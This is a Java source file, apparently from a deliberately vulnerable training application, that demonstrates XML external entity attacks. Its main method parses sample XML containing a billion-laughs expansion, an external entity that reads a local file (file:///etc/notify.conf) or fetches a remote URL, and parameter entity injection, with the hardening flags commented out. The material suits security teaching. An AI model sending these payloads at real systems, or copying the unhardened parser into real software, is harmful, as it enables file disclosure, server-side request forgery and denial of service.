package org.sasanlabs.service.vulnerability.xxe;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

import javax.xml.bind.JAXBContext;
import javax.xml.bind.JAXBElement;
import javax.xml.bind.JAXBException;

import org.sasanlabs.internal.utility.annotations.VulnerableAppRestController;
import org.sasanlabs.service.vulnerability.xxe.bean.Book;
import org.sasanlabs.service.vulnerability.xxe.bean.ObjectFactory;
import org.sasanlabs.vulnerability.types.VulnerabilityType;

/**
 * Great talk: https://www.youtube.com/watch?v=DREgLWZqMWg
 * Good resource: https://portswigger.net/web-security/xxe
 * Great document on parameter entities attack: https://securitylab.github.com/research/restlet_xxe_vulnerability_CVE-2017-14949
 * @author KSASAN preetkaran20@gmail.com
 */
@VulnerableAppRestController(
        descriptionLabel = "JWT_INJECTION_VULNERABILITY",
        value = "XXEVulnerability",
        type = {VulnerabilityType.XXE})
public class XXEVulnerability {
//
//	saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
	//
//	saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
//	saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
/**
 * For adding levels we need to play with above flags.	
 */
	
	@SuppressWarnings("unchecked")
	public static void main(String[] args) throws JAXBException, UnsupportedEncodingException {
		JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);
		InputStream in = new ByteArrayInputStream(("<?xml version=\"1.0\" ?>" +
"<!DOCTYPE lolz [\n" + 
" <!ENTITY lol \"lol\n\">\n" + 
" <!ELEMENT lolz (#PCDATA)>\n" + 
" <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" + 
//" <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n" + 
//" <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" + 
//" <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" + 
//" <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" + 
//" <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n" + 
" <!ENTITY lol8 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n" + 
//" <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n" + 
" <!ENTITY lol9 \"&lol8;\">\n" + 
"]>"+
			"<book>" + 
				"  <name>singh</name>" + 
				"  <isbn>isbn</isbn>" + 
				"  <author>author</author>" + 
				"  <publisher>&lol9;</publisher>" + 
				"</book>").getBytes("UTF-8"));
		
		 in = 
					new ByteArrayInputStream(("<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + 
	"<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"https://jsonplaceholder.typicode.com/posts\"> ]>"+
//							"<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/notify.conf\"> ]>" + 
							"<book>" + 
							"  <name>singh</name>" + 
							"  <isbn>isbn</isbn>" + 
							"  <author>author</author>" + 
							"  <publisher>&xxe;</publisher>" + 
							"</book>").getBytes("UTF-8"));
		
		 in = 
				new ByteArrayInputStream(("<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + 
						"<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/notify.conf\"> ]>" + 
						"<book>" + 
						"  <name>singh</name>" + 
						"  <isbn>isbn</isbn>" + 
						"  <author>author</author>" + 
						"  <publisher>&xxe;</publisher>" + 
						"</book>").getBytes("UTF-8"));
		 
		 in = 
					new ByteArrayInputStream(("<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + 
							"<!DOCTYPE root [\n" + 
							"<!ENTITY % param1 \"<!ENTITY internal 'some_text'>\">\n" + 
							"%param1;\n" + 
							"]>"+
							"<book>" + 
							"  <name>singh</name>" + 
							"  <isbn>isbn</isbn>" + 
							"  <author>author</author>" + 
							"  <publisher>&internal;</publisher>" + 
							"</book>").getBytes("UTF-8"));
		JAXBElement<Book>  book = (JAXBElement<Book>)(jc.createUnmarshaller().unmarshal(in));
		System.out.print(book.getValue().getAuthor() + "   " + book.getValue().getName() + "   " + book.getValue().getPublisher() );
	}
	
}
